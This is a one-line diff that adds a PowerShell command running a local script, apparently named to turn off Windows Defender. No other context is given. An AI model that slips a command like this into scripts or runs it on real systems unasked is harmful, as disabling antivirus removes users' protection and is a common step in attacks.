@@ -1,0 +1,1 @@
+powershell -command C:\BATCH\defenderoff.ps1
